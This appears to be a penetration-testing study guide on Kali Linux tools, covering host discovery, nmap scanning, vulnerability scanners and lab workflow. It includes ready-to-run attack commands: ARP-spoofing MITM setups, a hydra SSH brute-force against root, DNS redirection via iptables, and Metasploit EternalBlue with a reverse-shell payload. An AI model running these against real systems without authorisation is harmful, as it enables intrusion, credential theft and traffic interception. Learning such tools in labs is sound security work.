# 🛡️ Introduction to Kali Linux in Cybersecurity

**Kali Linux** is a specialized Linux distribution used primarily for **penetration testing, ethical hacking, and network security assessments**. It includes hundreds of built-in tools to analyze, scan, attack, and protect computer networks.

These tools operate across different **OSI layers** (especially Layer 2 – Data Link, Layer 3 – Network, Layer 4 – Transport, and Layer 7 – Application).

---

## 🧠 Foundational Concepts

### 🔐 What is “In the Wild”?
A vulnerability or attack that is actively used by real-world hackers—not just a lab experiment. For example, a zero-day that has been observed in an actual attack.

### 🧪 What is an IOC (Indicator of Compromise)?
Artifacts like suspicious IPs, domains, file hashes, or registry changes that suggest a system has been compromised.

### 📊 MITRE ATT&CK Framework
A global database of known attacker tactics and techniques. It helps in **threat modeling, detection, and red teaming**.

### 📁 CVE / CWE / CVSS
- **CVE**: Common Vulnerabilities and Exposures. A public identifier for known software flaws.
- **CWE**: Common Weakness Enumeration. Classifies vulnerability types (e.g., buffer overflow).
- **CVSS**: A scoring system (0–10) to rate the severity of CVEs based on their impact and exploitability.

---

## 🌐 Layer 2 Tools (Network Discovery and Mapping)

### 🔍 `netdiscover`
- Discovers live hosts via ARP scanning.
- Use: `netdiscover -r 192.168.1.0/24`
- Works passively by listening to ARP broadcasts.

### 🌐 `arp-scan`
- Uses ARP protocol to list devices on a local subnet.
- Use: `sudo arp-scan 192.168.0.0/24`
- Good for identifying all devices (even those that block ICMP ping).

### 📡 `arping`
- Sends ARP packets to check if a host is alive.
- Use: `arping 192.168.0.1`
- Alternative to ping when ICMP is blocked.

### 🧰 `macchanger`
- Spoofs MAC addresses for anonymity or to bypass filters.
- Use: `macchanger -r eth0` (randomize MAC of eth0)

### 📊 `nload`
- Monitors real-time bandwidth on each interface.
- Simple CLI tool to track sent and received traffic.

### 📷 `wireshark` / `tshark`
- GUI and CLI versions of a powerful network packet analyzer.
- Use to analyze traffic in depth (e.g., protocols, flags, IPs).

### 🧱 `tcpdump`
- CLI packet sniffer. 
- Use: `tcpdump -ni eth0 arp or icmp`
- Very useful for filtering specific traffic (ARP, ICMP, TCP, etc.).

### 🔐 `snort`
- Intrusion detection system (IDS).
- Can log, alert, and block suspicious patterns in network traffic.

### 📏 `ipcalc`
- Calculates and displays subnet, network, and broadcast info.
- Use: `ipcalc 192.168.0.15/24`

---

## 🌍 Layer 3 – Network Scanning and Reconnaissance

### 🔎 `nmap`
- The most used scanner for network mapping and service discovery.
- Key Modes:
  - `nmap -sn 192.168.0.0/24` – Ping scan (live hosts only)
  - `nmap -sS` – Stealth SYN scan
  - `nmap -A` – Aggressive (OS detection, script scan, traceroute)
  - `nmap -sV` – Detect service versions
  - `nmap --script vuln` – Run vulnerability detection scripts
- Save results:
  - `nmap -oA report 192.168.0.0/24` – Save in all formats

---

## 🔧 Packet Manipulation & Spoofing Tools

### 🔄 `arpspoof`
- Redirect traffic between a victim and router (MITM).
- Example: `arpspoof -i eth0 -t 192.168.0.101 192.168.0.1`

### 🧠 MITM Setup Checklist:
1. Enable IP forwarding: `sysctl -w net.ipv4.ip_forward=1`
2. Disable ICMP redirects: `sysctl -a | grep send_redirects` → set to `0`

### 🧰 `ettercap`
- GUI + CLI tool for sniffing and spoofing.
- Supports ARP poisoning, DNS spoofing, and plugin filtering.

### 🔬 `bettercap`
- Modern alternative to ettercap.
- Commands:
  - `net.probe on`
  - `net.recon on`
  - `arp.spoof on`
  - `net.sniff on`

---

## 💻 Layer 7 – Application Tools

### 📡 `hydra`
- Brute-force login cracker (SSH, FTP, HTTP, etc.).
- Example: `hydra -l root -P rockyou.txt ssh://192.168.0.101`

### 🔧 `Burp Suite`
- Web proxy to intercept and manipulate HTTP/S traffic.
- Launch: `burpsuite`
- Intercepts login forms, parameters, cookies, sessions.

---

## 🎯 Vulnerability Assessment Tools

### 📊 `OpenVAS` / `Greenbone`
- Free vulnerability scanner that checks for known CVEs.
- Setup:
  ```bash
  sudo apt install openvas
  sudo gvm-setup
  sudo gvm-start
  ```

### 🔍 `Nessus`
- Commercial vulnerability scanner.
- Web GUI at: `https://localhost:8834`
- Strong plugin support, compliance checks, and custom scanning.

---

## 🧨 Exploitation Tools

### 🎯 `Metasploit`
- Framework for exploit development and testing.
- Start: `sudo msfconsole`
- Workflow:
  1. `search ms17_010`
  2. `use exploit/windows/smb/ms17_010_eternalblue`
  3. Set options: `set RHOST`, `set PAYLOAD`, `run`

### 🔥 Example Module:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.0.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.1
run
```

---

## 🧾 Logging & Documentation

### 📝 `script`
- Records all terminal activity to a file.
- Example: `script -a mylog.txt`

### 📁 Best Practice
- Create one folder per tool.
- Log commands, outputs, screenshots.
- Store CVE links, command results, tool versions, etc.


---

## 🧠 Additional Notes and Enhancements

### 🔎 Layer 2 Discovery Tools (Expanded)

- **netdiscover**: A tool for passive or active network discovery based on ARP requests. Helps to identify live hosts without generating a lot of noise.
- **wireshark**: A GUI-based network protocol analyzer that captures and visualizes packet-level data. Extremely useful for investigating protocols like ARP, DHCP, ICMP, HTTP, etc.
- **tshark**: CLI version of Wireshark. Supports similar filtering and capturing capabilities. Ideal for scripting and remote sessions.
- **tcpdump**: A powerful CLI sniffer and packet analyzer. Use `tcpdump -ni eth0 arp or icmp` to capture Layer 2 ARP and ICMP packets for network discovery or troubleshooting.
- **snort**: A signature-based IDS that can also operate in packet sniffing mode. Use for detecting malicious activity or scanning attempts.
- **arping**: Sends ARP packets directly to a target to determine if it is alive. Works at Layer 2 and is more accurate when ICMP is blocked.
- **hping3**: A TCP/IP packet assembler that supports ICMP, TCP, UDP, and RAW-IP modes. Can be used to craft custom ping packets or simulate attacks.
- **ipcalc**: Helps calculate subnet information like network range, broadcast address, and host capacity. Often used in planning or validation of network configurations.
- **netstat -nr**: Displays the routing table, showing gateway IPs and interface routes.
- **arp -an**: Shows the current ARP cache. Useful to detect potential ARP spoofing or monitor host activity.
- **arp-scan**: A fast and reliable way to scan for live devices using ARP at Layer 2. Use `arp-scan 192.168.0.0/24` to list hosts.
- **macchanger**: Allows users to spoof MAC addresses to test network filters or anonymize presence.
- **nload**: Provides a live view of inbound/outbound network traffic per interface.
- **network manager stop**: Disabling automatic network management helps when performing manual attacks, sniffing, or interface manipulation.

### 🧰 General Tips

- Use `script -a <filename>` to log all terminal interactions.
- Customize your terminal prompt to include timestamps and hostname for better tracking.
- Organize each test into separate folders with logs, screenshots, and configurations.

### 🌐 Online Resources

- **Kali Tools Search Engine**: https://tools.kali.org/
- **CVE Details**: https://www.cvedetails.com/
- **Zerodium**: https://www.zerodium.com/
- **Pwn2Own Competition**: https://www.zerodayinitiative.com/Pwn2Own/
- **EPSS** (Exploit Prediction Scoring System): https://www.first.org/epss/



---

## 📡 Deep-Dive Additions: Tools, Techniques, and Scenarios

### 🔍 More on Layer 2 Discovery Tools (Expanded with Examples)

- **netdiscover**
  - Detects active hosts on the local subnet via ARP.
  - Passive mode avoids active traffic. Use:
    ```bash
    sudo netdiscover -p -r 192.168.1.0/24
    ```

- **wireshark**
  - Graphical packet analyzer. Filter by protocol:
    ```bash
    arp || icmp || dhcp
    ```

- **tshark**
  - CLI version of Wireshark:
    ```bash
    sudo tshark -i eth0 -Y "arp"
    ```

- **tcpdump**
  - ARP/ICMP packet capture:
    ```bash
    sudo tcpdump -ni eth0 arp or icmp
    ```

- **snort**
  - IDS/IPS engine. To run in sniff mode:
    ```bash
    sudo snort -i eth0 -A console -c /etc/snort/snort.conf
    ```

- **arping**
  - Checks for live hosts using ARP:
    ```bash
    arping 192.168.1.1
    ```

- **hping3**
  - Craft packets manually:
    ```bash
    hping3 -1 192.168.0.1 --count 5
    ```

- **ipcalc**
  - Subnet breakdown:
    ```bash
    ipcalc 192.168.0.15/24
    ```

- **netstat -nr**
  - Show routing table.

- **arp -an**
  - Show ARP cache (MAC to IP mappings).

- **arp-scan**
  - Discover devices on a subnet:
    ```bash
    sudo arp-scan 192.168.0.0/24
    ```

- **network-manager stop**
  - Disable auto-config:
    ```bash
    sudo systemctl stop NetworkManager
    ```

- **macchanger**
  - Change MAC address:
    ```bash
    sudo macchanger -r eth0
    ```

- **nload**
  - Live bandwidth monitor:
    ```bash
    sudo nload eth0
    ```

---

### 🌍 nmap: Deep Info

- `nmap -vv -sP -oA scan 192.168.0.0/24`
  - `-vv`: verbose, `-sP` (now `-sn`): ping scan only.
  - `-oA`: output to all formats (XML, grepable, normal).
- Scan Steps:
  1. Discover with ARP (`arp-scan`).
  2. Use SYN scan (`-sS`).
  3. Identify versions/services (`-sV`, then fingerprint with netcat or metasploit).

---

### 💥 Layer 2 Attacks

- **ARP Spoofing** (MITM):
  ```bash
  arpspoof -c own -i eth0 -t 192.168.0.111 -r 192.168.0.1
  sysctl -w net.ipv4.ip_forward=1
  ```

- **DHCP Stealing**
  - Use `dhcpstarv` or `Yersinia` to exhaust DHCP pool and offer rogue leases.

---

### 📁 Host Resolution

```bash
cat /etc/resolv.conf
```

---

### 🧾 Logging All Commands

```bash
script -a mylogfile.log
```

---

### 📂 Task Structure

- Change prompt to `user@host:timestamp$`.
- Create per-tool folders with logs/screenshots.

---

### 🧪 Vulnerability Resources

- [CVE Details](https://www.cvedetails.com)
- [first.org/epss](https://first.org/epss) – exploit prediction scores
- [Zerodium](https://www.zerodium.com)
- [Pwn2Own](https://www.zerodayinitiative.com/Pwn2Own/)

---

### 🔐 Certificates

- **CAA**: DNS entry restricting which CAs may issue certs.
- **Let’s Encrypt**: Free CA. Use with tools like Certbot.

---

### 📦 Scanning Tools

- **Greenbone / OpenVAS**
- **Nessus**: Trial or Essentials version
- **Burp Suite Pro**
  - Avoid using aggressive tools like Hydra in production Nessus scans.

---

### ⚔️ Attacks with `iptables`

- Redirect DNS traffic for spoofing:
  ```bash
  iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
  ```

---

### 📚 Metasploit Modules

```bash
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/vnc/vnc_login
use auxiliary/scanner/smb/enumshares
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/meterpreter/reverse_tcp
```

---

### 🧪 Example Payload Test

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.0.105
set LHOST 192.168.0.1
run
```

---

### 💡 Tools & VMs for Labs

- **VMs**: Metasploitable, BadStore, PentesterLab, Windows 7/10
- **HackTheBox**: Use for red team practice (can get academic license)
- **Caldera**: [MITRE Caldera](https://github.com/mitre/caldera) is a red-team automation framework for simulating adversarial behavior.

---

### 📋 Workflow (Igor’s Steps)

1. Create folder per tool
2. Run tool (e.g., nmap)
3. Save results
4. Run scanner (e.g., Nessus)
5. Document vulnerabilities
6. Record terminal with `script`
